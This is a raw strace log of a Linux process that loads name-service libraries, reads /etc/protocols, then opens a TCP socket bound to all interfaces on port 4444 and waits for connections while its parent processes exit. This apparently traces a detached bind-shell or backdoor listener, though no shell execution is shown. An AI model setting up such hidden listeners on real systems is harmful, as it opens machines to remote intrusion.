8192  07:22:17.539548 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d4f000
8192  07:22:17.539565 close(6)          = 0
8192  07:22:17.539580 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8192  07:22:17.539613 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.539636 stat64("/lib/tls/i686/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.539656 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.539676 stat64("/lib/tls/i686/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.539693 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.539712 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8192  07:22:17.539740 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.539758 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8192  07:22:17.539785 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.539851 stat64("/lib/tls/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.539868 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.539886 stat64("/lib/tls/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.539902 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.539921 stat64("/lib/tls/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.539937 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.539955 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8192  07:22:17.539981 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540000 stat64("/lib/i686/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540016 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540034 stat64("/lib/i686/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540051 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540069 stat64("/lib/i686/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540085 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540103 stat64("/lib/i686", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540119 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540137 stat64("/lib/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540153 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540171 stat64("/lib/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540187 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540204 stat64("/lib/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540220 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540237 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8192  07:22:17.540263 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540293 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540313 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540332 stat64("/usr/lib/tls/i686/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540350 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540369 stat64("/usr/lib/tls/i686/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540386 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540409 stat64("/usr/lib/tls/i686", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540427 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540446 stat64("/usr/lib/tls/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540463 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540481 stat64("/usr/lib/tls/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540498 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540517 stat64("/usr/lib/tls/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540534 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540551 stat64("/usr/lib/tls", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540568 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540587 stat64("/usr/lib/i686/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540605 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540623 stat64("/usr/lib/i686/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540640 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540660 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8192  07:22:17.540687 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540705 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8192  07:22:17.540732 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540751 stat64("/usr/lib/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540767 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540793 stat64("/usr/lib/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540810 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540829 stat64("/usr/lib/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540845 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540863 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
8192  07:22:17.540889 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540910 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540929 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540949 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.540968 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.540988 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541006 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541025 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541044 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541064 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541082 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541102 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541124 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541143 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541161 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541180 stat64("/lib/i486-linux-gnu/tls", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541198 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541218 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541237 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541256 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541275 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541304 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541322 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541341 stat64("/lib/i486-linux-gnu/i686", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541359 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541379 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541397 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541416 stat64("/lib/i486-linux-gnu/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541433 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541453 stat64("/lib/i486-linux-gnu/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541470 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541489 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8192  07:22:17.541516 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541538 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541558 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541579 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541598 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541619 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541638 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541658 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541677 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541697 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541717 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541736 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541755 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541781 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541805 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541825 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541843 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541864 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541883 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541905 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541923 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541944 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.541963 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.541982 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.542001 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.542021 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.542039 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.542059 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.542077 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.542097 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfb0af9c) = -1 ENOENT (No such file or directory)
8192  07:22:17.542115 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8192  07:22:17.542134 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8192  07:22:17.542163 munmap(0xb7d4f000, 29913) = 0
8192  07:22:17.542191 open("/etc/ld.so.cache", O_RDONLY) = 6
8192  07:22:17.542209 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8192  07:22:17.542234 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d4f000
8192  07:22:17.542249 close(6)          = 0
8192  07:22:17.542264 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8192  07:22:17.542294 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
8192  07:22:17.542317 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8192  07:22:17.542474 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
8192  07:22:17.542506 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d44000
8192  07:22:17.542527 mmap2(0xb7d4d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d4d000
8192  07:22:17.542550 close(6)          = 0
8192  07:22:17.542582 munmap(0xb7d4f000, 29913) = 0
8192  07:22:17.542605 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
8192  07:22:17.542628 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
8192  07:22:17.542649 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
8192  07:22:17.542675 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d56000
8192  07:22:17.542691 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
8192  07:22:17.543032 close(6)          = 0
8192  07:22:17.543047 munmap(0xb7d56000, 4096) = 0
8192  07:22:17.543071 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
8192  07:22:17.543090 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
8192  07:22:17.543115 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d56000
8192  07:22:17.543130 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
8192  07:22:17.543458 close(6)          = 0
8192  07:22:17.543472 munmap(0xb7d56000, 4096) = 0
8192  07:22:17.543507 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
8192  07:22:17.543536 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0b4a8) = -1 EINVAL (Invalid argument)
8192  07:22:17.543555 _llseek(6, 0, 0xbfb0b4f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8192  07:22:17.543571 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0b4a8) = -1 EINVAL (Invalid argument)
8192  07:22:17.543586 _llseek(6, 0, 0xbfb0b4f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8192  07:22:17.543600 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
8192  07:22:17.543670 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
8192  07:22:17.543714 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
8192  07:22:17.543746 listen(6, 5)      = 0
8192  07:22:17.543855 accept(6,  <unfinished ...>
8191  07:22:17.558816 exit_group(0)     = ?
8189  07:22:17.558938 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 8191
8189  07:22:17.558960 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8189  07:22:17.558990 --- SIGCHLD (Child exited) @ 0 (0) ---
8189  07:22:17.559001 waitpid(-1, 0xbfe409b8, WNOHANG) = -1 ECHILD (No child processes)
8189  07:22:17.559017 sigreturn()       = ? (mask now [])
8189  07:22:17.559042 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
8189  07:22:17.559097 exit_group(0)     = ?
4519  07:22:17.559147 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 8189
4519  07:22:17.559163 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:22:17.559184 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:22:17.559206 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:22:17.559221 --- SIGCHLD (Child exited) @ 0 (0) ---
